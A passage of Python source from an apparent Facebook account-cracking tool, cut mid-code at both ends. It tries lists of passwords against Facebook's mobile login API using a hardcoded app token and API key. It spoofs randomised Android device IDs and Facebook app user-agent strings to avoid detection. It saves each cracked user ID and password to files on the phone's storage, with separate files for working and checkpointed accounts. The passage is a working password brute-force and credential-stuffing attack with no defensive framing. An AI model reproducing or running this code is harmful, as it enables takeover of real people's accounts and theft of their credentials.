			dvlk = random.choice(usr)
			ENB = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/ONO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]'
			uas = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; GT-I9300 Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+ENB
			fbbv = str(random.randint(111111111,999999999))
			models = random.choice(['SM-G920F','SM-T535','SM-T231','SM-J320F','GT-I9190','GT-N7100','SM-T561','GT-I9500','SM-G930F','SM-J510FN','GT-P5100','GT-N8000','SM-T531','SPH-L720','GT-I9500','SM-G935F','SM-T531','SM-J320FN','SM-A500F','SM-A500FU','SM-T311','GT-P5210','SM-T230','GT-I9192','SM-T235','SM-A500F','SM-G920F','SM-A500H','GT-I9300','SM-J320F','GT-N8000|/','SM-G900F','GT-S7390','GT-P5100','SM-J510FN','GT-P5110','GT-I9301I','SM-T311','GT-P5200','SM-J320M','SM-T820','SM-G935F','SM-J701F','GT-I9301I','SM-T111|JDQ39','SM-J510FN','SM-T705','GT-N5100','GT-I9300I','GT-P5100','SM-T805','SM-J320H','SM-T310','SM-T705','GT-P3110','GT-I9300','SM-G950F','SM-J510FN','SM-J701F','SM-T315','GT-P5220','SM-T525','SM-T555'])
			fbrr = str(random.randint(111111111,999999999))
			vs1 = str(random.randint(111,333))
			vs2 = str(random.randint(33,55))
			vs3 = str(random.randint(111,222))
			#ENB = random.choice(['[fban/fb4a;fbav/'+vs1+'.0.0.'+vs2+'.'+vs3+';fbpn/com.facebook.katana;fblc/en_us;fbbv/'+fbbv+';fbcr/null;fbmf/samsung;fbbd/samsung;fbdv/'+models+';fbsv/6.0.1;fbca/armeabi-v7a:armeabi;fbdm/{density=1.5,width=540,height=960};fb_fw/1;fbrv/'+fbrr+';]','[fban/fb4a;fbav/'+vs1+'.0.0.'+vs2+'.'+vs3+';fbpn/com.facebook.katana;fblc/en_us;fbbv/'+fbbv+';fbcr/null;fbmf/samsung;fbbd/samsung;fbdv/'+models+';fbsv/samsung.0.0;fbca/armeabi-v7a:armeabi;fbdm/{density=2.25,width=350,height=846};]']) 
			#uas = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; '+models+' Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+ENB
			#1 method issue es ma ha
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_US',
				'client_country_code':'US',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'api_key': '8114af471d039628db5c68cb127af936',
				'user-agent':uas,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
			url = 'https://b-api.facebook.com/method/auth.login'
			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
			q = json.loads(po)
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [TRT-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/TRT-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/TRT-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except Exception as e:
		pass
#new method
                
def trt3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;34m [NOYON-RND] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(44,333)}.0.0.{random.randint(0,55)}.{random.randint(111,222)}'
                        densi = random.choice(['1.0','1.5','2.0','2.5','3.0','3.5','4.0'])
                        wiidth = str(random.randint(720,1440))
                        tel = random.choice(['null','AIRTEL','T-Mobile','Telia','motorola','Claro','movister','TELKOMSEL','Indosat','XL Axiata','AXIS','XL','Metro by T-Mobile','Tele2 LT','Bouygues Telecom','Zong','Marshmallow','Telekom China'])
                        heiight = str(random.randint(1280,2560))
                        fbbv = str(random.randint(111111111,999999999))
                        fbkk = str(random.randint(111111111,999999999))
                        vs = f"{random.randint(4,10)}.{random.randint(0,1)}.{random.randint(0,1)}"
                        vn = str(random.randint(4,13))
                        vq = str(random.randint(111111,999999))
                        vp = str(random.randint(111,999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        model4 = random.choice(['1210','1250','1300','1310','1350','1410','1420','1450','1500','1510','1550','1610','1650','1710','1720','1750','1820','1910','1920','1950','2010','1930','1940','1960','2110','2150','V1020','V1120','V1220','V1320','V1420','V1520','V1620','V1720','V1820','V1920','V1910','V2010','V2020','V2120','V2110'])
                        fban = random.choice(['FB4A','Orca-Android'])
                        fbks = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
                        vss = random.choice(['4','5','6','8','8','9','10','11','12'])
                        USK = random.choice(['Dalvik/1.6.0 (Linux; U; Android 4.0.4; Vodafone Smart ultra 6 Build/IMM76D) [FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9515 Build/JZO54K) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.1.2; HTC Desire 500 Build/JZO54K) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/HTC Desire 500;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9082 Build/JDQ39) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9082;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-N5110 Build/JDQ39) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.3312501,width=800,height=1280};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N5110;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-N8010 Build/JDQ39) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1280,height=752};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N8010;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-N5100 Build/JDQ39) [FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/nl_NL;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N5100;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/2.1.0 (Linux; U; Android 5.1; GT-I8160 Build/LMY47I) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.3312501,width=800,height=1280};FBLC/de_DE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I8160;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/VIVA;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y625-U43;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=888};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 610;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=888};FBLC/en_US;FBCR/ETB 4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1022;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=904};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2105;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900M;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N900;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/nl_NL;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]'])
                        models = random.choice(['SM-M336BU','SM-M332BU','SM-M433BU','SM-M320BU','SM-M330BU','SM-G920F','SM-T535','SM-T231','SM-J320F','GT-I9190','GT-N7100','SM-T561','GT-I9500','SM-G930F','SM-J510FN','GT-P5100','GT-N8000','SM-T531','SPH-L720','GT-I9500','SM-G935F','SM-T531','SM-J320FN','SM-A500F','SM-A500FU','SM-T311','GT-P5210','SM-T230','GT-I9192','SM-T235','SM-A500F','SM-G920F','SM-A500H','GT-I9300','SM-J320F','GT-N8000|/','SM-G900F','GT-S7390','GT-P5100','SM-J510FN','GT-P5110','GT-I9301I','SM-T311','GT-P5200','SM-J320M','SM-T820','SM-G935F','SM-J701F','GT-I9301I','SM-T111|JDQ39','SM-J510FN','SM-T705','GT-N5100','GT-I9300I','GT-P5100','SM-T805','SM-J320H','SM-T310','SM-T705','GT-P3110','GT-I9300','SM-G950F','SM-J510FN','SM-J701F','SM-T315','GT-P5220','SM-T525','SM-T555'])
                        bu = random.choice(['IMM76D','NRD90M','NMF26X','NRD90M','LRX22G','KOT49H','LMY47V','KOT49H','KOT49H','KTU84P','LRX22C','NRD90M','NMF26X','IML74Kr','JZO54K','LRX22G','KOT49H','JDQ39','NRD90M','KOT49H','LMY47V','MMB29M','MMB29M','KOT49H','KOT49H','KOT49H','JDQ39M','JZO54K','LMY49M','JSS15J','LRX22G','MMB29K','NRD90M','LMY47V','JZO54K'])
                        ed = random.choice(['en_US','en_GB','th_TH','id_ID','sv_SE','en_ES','es_LA','vi_VN','en_MX','sv_SE','fr_FR'])
                        facebook_version = f"{random.randint(100, 200)}.{random.randint(0, 100)}.{random.randint(0, 100)}.{random.randint(0, 100)}"
                        fbkj = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
                        #ua = '[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=350,height=846};]'
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        iop = str(random.randint(66,333))
                        usk = random.choice(['Dalvik/1.6.0 (Linux; U; Android 4.0.4; Vodafone Smart ultra 6 Build/IMM76D) [FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634218;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9515 Build/JZO54K) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.1.2; HTC Desire 500 Build/JZO54K) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/HTC Desire 500;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9082 Build/JDQ39) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9082;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-N5110 Build/JDQ39) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.3312501,width=800,height=1280};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N5110;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-N8010 Build/JDQ39) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1280,height=752};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N8010;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-N5100 Build/JDQ39) [FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/nl_NL;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N5100;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]','Dalvik/2.1.0 (Linux; U; Android 5.1; GT-I8160 Build/LMY47I) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.3312501,width=800,height=1280};FBLC/de_DE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I8160;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/VIVA;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y625-U43;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=888};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 610;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=888};FBLC/en_US;FBCR/ETB 4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1022;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=904};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2105;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900M;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N900;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/nl_NL;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]'])
                        usee = random.choice(['[FBAN/FB4A;FBAV/59.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/'+fbsv+'.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};]','[FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]','[FBAN/FB4A;FBAV/60.0.0.12.108;FBBV/383919058;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/384752909;FBCR/Metro by T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2025;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/61.0.0.12.108;FBBV/383919058;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/384752909;FBCR/Metro by T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2025;FBSV/'+fbsv+'.0.1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/37.0.0.22.115;FBBV/383919058;FBDM/{density=2.8125,width=1080,height=2156};FBLC/en_US;FBRV/384752909;FBCR/Metro by T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2025;FBSV/'+fbsv+'.0.1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/'+fbsv+'.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/'+fbsv+'.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'])
                        tct = random.choice(['Dalvik/2.1.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) ','Dalvik/2.1.0 (Linux; Android 6.0.1; SAMSUNG SM-G532F Build/MMB29T) ','Dalvik/2.1.0 (Linux; Android 7.1.1; SAMSUNG SM-J250F Build/NMF26X) ','Dalvik/2.1.0 (Linux; Android 10; SAMSUNG SM-M115F) ','Dalvik/2.1.0 (Linux; Android 9; LLD-AL20) ','Dalvik/2.1.0 (Linux; Android 9; Redmi Note 6 Pro Build/PKQ1.180904.001; wv) ','Dalvik/2.1.0 (Linux; Android 6.0.1; SAMSUNG SM-J700H Build/MMB29K) ','Dalvik/2.1.0 (Linux; Android 9; CPH1923) ','Dalvik/2.1.0 (Linux; Android 10; SAMSUNG SM-A205F) ','Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G615F Build/M1AJQ; wv) ','Dalvik/2.1.0 (Linux; Android 8.1.0; vivo 1811) ','Dalvik/2.1.0 (Linux; Android 5.1.1; SAMSUNG SM-J200H Build/LMY48B) ','Dalvik/2.1.0 (Linux; Android 6.0; itel S11 Build/MRA58K; wv) ','Dalvik/2.1.0 (Linux; Android 9; vivo 1906) ','Dalvik/2.1.0 (Linux; Android 8.1.0; SAMSUNG SM-J710F) ','Dalvik/2.1.0 (Linux; Android 9; SAMSUNG SM-J701F) ','Dalvik/2.1.0 (Linux; U; Android 10; Mi A2 Lite Build/QKQ1.191002.002; wv) ','Dalvik/2.1.0 (Linux; Android 6.0.1; SAMSUNG SM-G532F) ','Dalvik/2.1.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G) ','Dalvik/2.1.0 (Linux; Android 10; SAMSUNG SM-M315F) ','Dalvik/2.1.0 (Linux; Android 10; RMX2030) ','Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A260G Build/OPR6; wv) ','Dalvik/2.1.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026; wv) ','Dalvik/2.1.0 (Linux; Android 6.0.1; SAMSUNG SM-J210F) ','Dalvik/2.1.0 (Linux; Android 6.0; CRO-U00 Build/HUAWEICRO-U00) ','Dalvik/2.1.0 (Linux; U; Android 5.1.1; en-US; SM-J200H Build/LMY48B) ','Dalvik/2.1.0 (Linux; Android 9; Redmi Note 8) ','Dalvik/2.1.0 (Linux; Android 5.1.1; SAMSUNG SM-J111F) ','Dalvik/2.1.0 (Linux; Android 5.1.1; SM-J200H) ','Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4X Build/N2G47H; wv) '])
                        model2 = random.choice(['M336BU','M332BU','M433BU','M320BU','M330BU','G800Y','G850Y','G900Y','G950Y','G1050Y','G1100Y','G1150Y','G1200Y','G1250Y','G1300Y','G1350Y','G1400Y','G1700Y','G1750Y','G150Y','G1800Y','G1850Y','G1900Y','G532Y','G532G','G532','G533','G550','J532','J532Y','G532Y','A1200F','A1250F','A1300F','A1350F','A1400F','A1700F','A1750F','A1800F','A1850F','A1900F','A1950F','A1200FU','A1250FU','A1400FU','A1450FU','A1700FU','A1750FU','A1800FU','A1850FU','A1900FU','A2150F','G2150G'])
                        #END = '[FBAN/FB4A;FBAV/208.0.0.38.104;FBBV/141745672;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBRV/142867518;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-'+model2+';FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        hj = random.choice(['H340n','H350n','H360n','H370n','H380n','H390n','H400n','H330n','H450n','H540n','H550n','H640n','H650n','H740n','H750n','H840n'])
                        fbbv = str(random.randint(111111111,999999999))
                        fbrr = str(random.randint(111111111,999999999))
                        vs1 = str(random.randint(111,333))
                        vs2 = str(random.randint(11,55))
                        vs3 = str(random.randint(111,222))
                        EDJ = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]'
                        #ENB = '[FBAN/FB4A;FBAV/'+vs1+'.0.0.'+vs2+'.'+vs3+';FBBV/'+fbbv+';FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+models+';FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
                        ug = random.choice(['Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]','Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]','Mozilla/5.0 (Linux; Android 8.1.0; SM-J415F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/356.0.0.7.89;]','Mozilla/5.0 (Linux; Android 8.1.0; SM-J415GN Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/406.0.0.13.115;]','Mozilla/5.0 (Linux; Android 9; SM-J415G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]','Mozilla/5.0 (Linux; Android 8.1.0; SM-J415F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile 